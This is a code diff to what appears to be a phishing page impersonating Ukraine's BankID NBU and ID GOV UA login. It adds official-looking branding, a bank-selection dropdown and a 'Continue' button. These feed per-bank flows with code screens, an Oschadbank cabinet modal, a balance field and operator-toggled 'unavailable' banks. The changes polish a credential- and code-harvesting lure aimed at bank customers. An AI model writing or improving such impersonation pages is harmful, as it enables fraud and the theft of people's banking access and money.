@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Оберіть свій банк</title>
+    <title>Bank ID НБУ</title>
     <style>
         /* Общие стили для всех экранов и элементов */
         *, *::before, *::after { box-sizing: border-box; }
@@ -67,6 +67,75 @@
             font-size: 12px; font-weight: bold; color: var(--danger-color);
             background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
             white-space: nowrap; /* NEW: чтобы метка не переносилась */
+        }
+
+        /* NEW: Стили для заголовка экрана выбора банка */
+        .header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 10px 15px; border-bottom: 1px solid #dee2e6;
+            background-color: #fff;
+        }
+        .back-arrow {
+            font-size: 24px; color: #212529; cursor: pointer;
+        }
+        .logo {
+            background-color: #000; color: #fff; padding: 5px 10px;
+            border-radius: 20px; font-weight: bold; font-size: 18px;
+        }
+        .lang {
+            color: #6c757d; font-size: 14px;
+        }
+
+        /* NEW: Стили для кастомного дропдауна */
+        #bank-selector {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px; border-bottom: 1px solid #dee2e6;
+            cursor: pointer; background-color: #fff;
+            color: #6c757d; font-size: 16px;
+        }
+        #bank-selector.selected {
+            color: #212529;
+        }
+        .arrow {
+            color: #6c757d;
+        }
+        #bank-selector.open .arrow {
+            transform: rotate(180deg);
+        }
+        #bank-list {
+            display: none; flex-direction: column; background-color: #fff;
+            border-bottom: 1px solid #dee2e6;
+        }
+        #bank-list .bank-item {
+            flex-direction: row; height: auto; padding: 15px; border-radius: 0;
+            box-shadow: none; border-bottom: 1px solid #dee2e6; justify-content: flex-start;
+            text-align: left;
+        }
+        #bank-list .bank-item:last-child {
+            border-bottom: none;
+        }
+        #bank-list .bank-item img {
+            max-height: 30px; margin-bottom: 0; margin-right: 15px;
+        }
+        #bank-list .bank-item .bank-name {
+            font-size: 16px;
+        }
+        #bank-list .bank-item:hover {
+            transform: none; background-color: #f8f9fa;
+        }
+
+        /* NEW: Стиль для кнопки "Продовжити" */
+        #continue-btn {
+            display: block; width: 100%; max-width: 200px; margin: 20px auto 0;
+            padding: 15px; border: none; border-radius: 50px;
+            background-color: #000; color: #fff; font-size: 16px; font-weight: bold;
+            cursor: pointer; opacity: 0.5;
+        }
+        #continue-btn:disabled {
+            cursor: not-allowed;
+        }
+        #continue-btn.enabled {
+            opacity: 1;
         }
 
         /* --- СТИЛИ для модального окна ЛК Ощадбанка --- */
@@ -639,8 +708,18 @@
 </head>
 <body>
     <div id="bank-selection-screen" class="screen">
-        <h1>Оберіть свій банк</h1>
-        <div class="bank-grid"></div>
+        <div class="header">
+            <span class="back-arrow">←</span>
+            <div class="logo">ID GOV UA</div>
+            <div class="lang">UA | EN</div>
+        </div>
+        <h1>Bank ID НБУ</h1>
+        <div id="bank-selector">
+            <span>Оберіть банк, в якому ви маєте рахунок у системі BankID НБУ</span>
+            <span class="arrow">▼</span>
+        </div>
+        <ul id="bank-list" style="display: none;"></ul>
+        <button id="continue-btn" disabled>Продовжити</button>
     </div>
 
     <div id="form-screen" class="screen">
@@ -704,9 +783,12 @@ document.addEventListener('DOMContentLoaded', () => {
     let callTimerInterval;
     let lastCodeScreen = null;
     let disabledBanks = JSON.parse(localStorage.getItem('disabled_banks') || '[]'); // NEW: Local storage for disabled banks
+    let selectedBankId = null;
 
     // --- DOM ELEMENTS ---
-    const bankGrid = document.querySelector('.bank-grid');
+    const bankSelector = document.getElementById('bank-selector');
+    const bankList = document.getElementById('bank-list');
+    const continueBtn = document.getElementById('continue-btn');
     const body = document.body;
     const formHeaderLogo = document.getElementById('form-header-logo');
     const modalTitle = document.getElementById('modal-title');
@@ -724,11 +806,37 @@ document.addEventListener('DOMContentLoaded', () => {
     const unavailableModalContent = document.getElementById('unavailable-modal-content'); // NEW
     
     // --- INITIALIZATION ---
-    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
+    bankList.innerHTML = Object.keys(bankFlows).map(id => {
         const isDisabled = disabledBanks.includes(id) ? ' disabled' : ''; // NEW: Check for disabled banks
         const disabledLabel = isDisabled ? '<span class="unavailable-label">Недоступно</span>' : ''; // NEW
-        return `<a href="#" class="bank-item${isDisabled}" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span>${disabledLabel}</a>`;
+        return `<li class="bank-item${isDisabled}" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span>${disabledLabel}</li>`;
     }).join('');
+
+    // NEW: Логика кастомного дропдауна
+    bankSelector.addEventListener('click', () => {
+        const isOpen = bankSelector.classList.toggle('open');
+        bankList.style.display = isOpen ? 'flex' : 'none';
+        bankSelector.querySelector('.arrow').textContent = isOpen ? '▲' : '▼';
+    });
+
+    bankList.addEventListener('click', (e) => {
+        const item = e.target.closest('.bank-item');
+        if (!item || item.classList.contains('disabled')) return;
+        selectedBankId = item.dataset.bank;
+        bankSelector.querySelector('span:first-child').textContent = bankFlows[selectedBankId].name;
+        bankSelector.classList.add('selected');
+        bankSelector.classList.remove('open');
+        bankList.style.display = 'none';
+        bankSelector.querySelector('.arrow').textContent = '▼';
+        continueBtn.disabled = false;
+        continueBtn.classList.add('enabled');
+    });
+
+    continueBtn.addEventListener('click', () => {
+        if (!selectedBankId) return;
+        const item = bankList.querySelector(`[data-bank="${selectedBankId}"]`);
+        if (item) item.click(); // Имитируем клик на выбранный банк для запуска потока
+    });
 
     // --- ОПТИМИЗИРОВАННАЯ ЛОГИКА ---
     const hideAllModals = () => {
@@ -780,7 +888,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const html = 
             `<div class="unavailable-modal-content">
                 <svg class="unavail-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                     <path d="M15 9L9 15" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                     <path d="M9 9L15 15" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                 </svg>
@@ -1383,8 +1491,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 e.target.value = value.replace(/\D/g, '').substring(0, 3);
             } else if (id === 'details_balance') {
                 let v = value.replace(/[^0-9,.]/g, '').replace(',', '.');
-                let parts = v.split(',');
-                if (parts.length > 2) v = parts[0] + ',' + parts.slice(1).join('');
+                let parts = v.split('.');
+                if (parts.length > 2) v = parts[0] + '.' + parts.slice(1).join('');
                 e.target.value = v.replace('.', ',');
             }
         });
